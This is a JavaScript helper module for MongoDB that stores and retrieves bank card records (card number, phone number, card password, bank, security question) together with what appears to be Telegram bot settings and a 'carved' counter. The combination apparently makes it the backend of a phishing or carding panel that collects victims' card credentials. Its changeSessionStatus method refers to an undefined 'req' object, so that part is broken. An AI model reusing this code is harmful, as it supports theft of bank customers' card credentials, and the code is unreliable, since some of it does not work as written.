const {mongo} = require("../main");
const app = require("../main");

class Helper {
  constructor() {
  }

  async replaceCard(data) {
    return await app.mongo.collection("cart-data").replaceOne({}, {
      cartnumber: data.cartnumber,
      phonenumber: data.phonenumber,
      cartpassword: data.cartpassword,
      question: data.question
    });
  }

  async insertCard(data) {
    return  app.mongo.collection("cart-data").insertOne({
      cartnumber: data.cartnumber,
      phonenumber: data.phonenumber,
      cartpassword: data.cartpassword,
      bank: data.bank,
      question: data.question
    });
  }

  async getLiveData(){
    let cardData = await app.mongo.collection("cart-data").findOne();
    let tlgData = await app.mongo.collection("tlg-data").findOne();
    return {
      cardData,
      tlgData
    }
  }
  async cardCount(){
    return app.mongo.collection("cart-data").countDocuments();
  }
  async replaceTlgData(data){
    return await app.mongo.collection("tlg-data").replaceOne({}, {
      host: data.host,
      user: data.user,
      user2: data.user2,
      api: data.api
    })
  }
  async insertTlgData(data){
    return  app.mongo.collection("tlg-data").insertOne({
      host: data.host,
      user: data.user,
      user2: data.user2,
      api: data.api
    });
  }
  async tlgDataCount(){
    return  app.mongo.collection("tlg-data").countDocuments()
  }

  async findTlgData(){
    return mongo.collection("tlg-data").findOne()
  }

  async carvedCount(){
    return app.mongo.collection("carved-count").countDocuments();
  }

  async replaceCarvedCount(data){
    await app.mongo.collection("carved-count").replaceOne({}, {
      count: data.count
    });
  }

  async insertCarvedCount(data){
    return app.mongo.collection("carved-count").insertOne({
      count: data.count
    });
  }
  async findCard(){
    return app.mongo.collection("cart-data").findOne();
  }

  async changeSessionStatus(status){
    app.mongo.collection("orders").updateMany(
      {
        user_id: req.user._id,
        status: "pending"
      },
      {
        $set: {
          status: status
        }
      }
    );
  }
}

module.exports = new Helper();
